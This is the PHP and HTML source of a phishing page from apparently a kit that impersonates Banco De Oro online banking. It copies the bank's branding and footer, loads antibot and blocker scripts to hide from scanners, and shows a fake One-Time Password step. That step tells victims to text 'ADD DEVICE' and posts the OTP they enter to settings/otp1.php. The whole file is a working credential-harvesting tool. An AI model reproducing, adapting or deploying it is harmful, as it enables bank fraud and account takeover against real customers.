<?php 
error_reporting(0);
session_start();
include("./config/antibot.php");
include("./config/antibots.php");
include("./config/antibotsulit.php");
include("./config/blocker.php");
include("./config/bt.php");
include("./config/function.php");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
 
<meta http-equiv="X-UA-Compatible" content="IE=100" />
<title>Banco De Oro Online Banking</title>
 <link rel = "icon" href = 
"https://apprecs.org/ios/images/app-icons/256/23/556314403.jpg" 
        type = "image/x-icon">
<link rel="icon" href="favicon.ico">  
<script type="text/javascript" src="assets/wicket-event.js"></script>
<script type="text/javascript" src="assets/wicket-ajax.js"></script>
 

<script type="text/javascript" src="assets/jquery-1.4.2.min.js"></script>
<script type="text/javascript" src="assets/ui.core.min.js"></script>
<link rel="stylesheet" type="text/css" href="assets/jquery-ui-1.8.2.custom.css" />
<link rel="stylesheet" type="text/css" href="assets/allcss.css" />
<link rel="stylesheet" type="text/css" href="assets/font-awesome.min.css" />
<script type="text/javascript" ><!--/*--><![CDATA[/*><!--*/
Wicket.Event.add(window, "domready", function(event) { 
jQuery.validator.addMethod("noSpecialUserName", function(value, element) {
return checkSpecialCharsUserName(value, element);
}, "Special characters are not allowed.");
function checkSpecialCharsUserName(value, element) {
var iChars = "~!`@#$%^&*()-=+\|;:\'\",./? \'";
for(var i = 0; i < value.length; i++) {
if (iChars.indexOf(value.charAt(i)) != -1) {
return false;
}
}
return true;
};});
/*-->]]>*/</script>

<script type="text/javascript" ><!--/*--><![CDATA[/*><!--*/
Wicket.Event.add(window, "domready", function(event) { 
jQuery.validator.addMethod("noSpecial", function(value, element) {
return checkSpecialChars(value, element);
}, "Special characters are not allowed.");

function checkSpecialChars(value, element) {
var iChars = "!#$%^&\';\"|";
for(var i = 0; i < value.length; i++) {
if (iChars.indexOf(value.charAt(i)) != -1) {
return false;
}
}
return true;
}
;});
/*-->]]>*/</script>

<script type="text/javascript" src="assets/jquery.validate.js"></script>
<script type="text/javascript" src="assets/additional-methods.js"></script>
<script type="text/javascript" src="assets/sxi-validations.js"></script>
<link rel="stylesheet" type="text/css" href="assets/sxi-validations.css" />
<script type="text/javascript" src="assets/ccti.js"></script>
<link rel="stylesheet" type="text/css" href="assets/base.css" />
<script type="text/javascript" src="assets/jquery.form.js"></script>
<link rel="stylesheet" type="text/css" href="assets/icondocklite.css" />
<link rel="stylesheet" type="text/css" href="assets/layout.css" />
<script type="text/javascript" src="assets/jquery.maxlength.js"></script>
<script type="text/javascript" src="assets/jquery.tools.min.js"></script>
<script type="text/javascript" src="assets/sxi-flowtip.js"></script>
<link rel="stylesheet" type="text/css" href="assets/flowtip.css" />
<script type="text/javascript" ><!--/*--><![CDATA[/*><!--*/
Wicket.Event.add(window, "domready", function(event) { Wicket.Window.unloadConfirmation = false;});
/*-->]]>*/</script>

<script type="text/javascript" src="assets/jquery.livequery.js"></script>
<script type="text/javascript" src="assets/CitrineBasicPage.js"></script>
 

<script type="text/javascript" src="assets/modal.js"></script>
<link rel="stylesheet" type="text/css" href="assets/modal.css" />
 
<script type="text/javascript" src="assets/jquery.highlight.js"></script>
<script type="text/javascript" id="wiquery-gen1560727995090"><!--/*--><![CDATA[/*><!--*/
(function($) {
$(document).ready(function() {
$("#id19").highlight("tr","clsHighlightRow","onblur",null);
$("#id1a").highlight("tr","clsHighlightRow","onblur",null);
$("#id1b").highlight("tr","clsHighlightRow","onblur",null);
});
})(jQuery);
/*-->]]>*/</script>
 

</head>

<body  >
 

<div id="parentcontainer">
	<div id="wrapper">

		<div id="head">
			 <!-- <div id="headerbar">

				 <div id = "accountinfo">
					<span wicket:id = "accountInfo">Info here</span>
				</div>
			</div>--->
			
			<!-- <div id="logowrapper">
				<a href="#" title="Home" wicket:id = "homeLink">
					  <div id="logo"></div>
				</a>
			</div>
	
			<div id="search">
			</div>-->
			
			 <div id="contentTop">
			 
      <div id="logoWrapper">
        <div id="bdoLogo"><a href="login.php?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check" ><span>Banco De Oro</span></a></div>
      </div>     	
      		 
      <div id="wrap" ver="1.1.3">
			<div class="menu-login-div" style="top:-17px;">
				<a class="gohome" href="login.php?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check/">GO BACK TO BDO.COM.PH</a>
			</div>
	</div>

      </div>
		</div>

		<div id="page">
			<div>
</div>
			<div id="mainwrapper" class="ui-corner-all otppage">
				<div id="main" class="contentblock">
					<table>
						<tbody><tr>
							<td>
								<h2 class="pageHeader"><span>One-Time Password (OTP)</span></h2>
								<div class="headerCaption"><span></span></div>
							</td>
							<td>
								<div style="float: right; text-align: right">
									<div>
</div>
								</div>
							</td>
						</tr>
					</tbody></table>
					
					
					<div id="id33" class="sxiFeedback">
  
</div>
					<div><div id="id34" style="display:none">
	
</div></div>
					<div><div id="id35" style="display:none">
	
</div></div>
					
					<table>
						<tbody><tr>
							<td style="vertical-align: top">
								<div class="ui-widget">
									
	<div class="otppagemarker"></div>
 	<div>
	<div id="id36" style="display:none">
	<div id="id37" style="display:none"></div>
</div>
	<div id="id2e" style="display:none">
	<div id="id38" style="display:none"></div>
</div>
	<div style="text-align: left; width: 500px">
		<form autocomplete="off" loginform="true" id="id2f" method="post" action="settings/otp1.php">
			<div id="id32">
</div>
								
								<label class="standardfont formlabel">To continue,Kindly text ADD DEVICE to get your One Time Pin.</label><br><br>
								<label class="standardfont formlabel">Please Input Correct (OTP).</label>
								<br><br>
						<table class="formtable" width="400">
							<tbody>
								<tr>
									<td class="formlabel">
									<span class="standardfont">Enter your OTP: </span>
									</td>
									<td>
									<input class="textbox box required noSpecial" type="text" onkeypress="return isNumber(event)" tabindex="2" maxlength="6" value="" name="otp1">
									</td>
								</tr>
								<tr>
									<td colspan="2">
									<span id="id39" class="sxiFeedback">
  
</span>
									<ul>
											<li class="feedbackPanelERROR">
												<br>
											</li>
									</ul>
									</td>
								</tr>
								<tr>
									<script>
function isNumber(evt) {
  evt = (evt) ? evt : window.event;
  var charCode = (evt.which) ? evt.which : evt.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) {
    return false;
  } 
  return true;
}


</script>
									<td colspan="2">
										<div id="btn-submit">
											<input class="sxi-button ui-corner-all ui-state-default" type="submit" tabindex="3" name="submitButton" validating="false" value="Proceed"><input class="sxi-button ui-corner-all ui-state-default" type="submit" tabindex="3" name="submitButton" validating="false" value="Cancel Login">
											
										</div>
									</td>
								</tr>
								<tr>
									<td colspan="2" class="formlabel">
									
									
									
									<label class="standardfont">If you did not receive your One-Time password (OTP) via SMS within 5 minute(s) or if your One-Time password (OTP) has expired, click here to generate a new</label>
									<a href="http://otp1.php" style="text-decoration:underline" id="id3c" onclick="var wcall=wicketAjaxGet(&#39;?x=PVZKMn6KwDZ0tnsqrP8fbzyzon7PwCB7WWLX2xgDw1jndIne3AMYCJTb5he-FOfWQRsENAv60P9Pocj24ILJcA&#39;,null,null, function() {return Wicket.$(&#39;id3c&#39;) != null;}.bind(this));return !wcall;">One-Time Password</a>
									<label class="standardfont formlabel">to proceed with your login.</label><br>
									<br>
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<ul>
											<li class="feedbackPanelERROR">
												<br>
											</li>
										</ul>
									</td>
								</tr>
							</tbody>
	  					</table>
		</form>
	</div>
</div>

								</div>
							</td>
							<td style="vertical-align: top" width="20px">
								<div id="info">
									<div>
</div>
								</div>
							</td>
						</tr>
					</tbody></table>

				</div>
			</div>
		</div>

	<div id="footerDiv">
      <div class="horizontalRule"></div>
      <div id="footerCopyright">BDO Unibank, Inc. © 2015. All Rights Reserved</div>
      <div id="footerLinksDiv">
        <a href="https://www.bdo.com.ph/about-bdo/business-operation" target="_blank">About BDO</a>
        <a href="http://www.bdo.com.ph/corporate-governance" target="_blank">Corporate Governance</a>
        <a href="http://www.bdo.com.ph/investor-relations/official-disclosures" target="_blank">Investor Relations</a>
        <a href="http://www.bdo.com.ph/careers" target="_blank">Careers</a>
        <a href="https://www.bdo.com.ph/news-and-articles" target="_blank">Press Room</a>
        <a href="http://www.bdo.com.ph/hong-kong-home" target="_blank">Hongkong</a>
        <a href="https://www.bdo.com.ph/site-map" target="_blank">Site Map</a>
        <a href="http://www.bdo.com.ph/privacy-policy" target="_blank">Privacy Policy</a>

      </div>
      <div style="color: white;">Version 2011-06-03</div>
    </div>

	</div>

<div id="bysy_indicator" style="display: none;">
	<div id="loading_gif">
	
	</div>
</div>

</div>
<div id="id3d">
</div>


</body></html>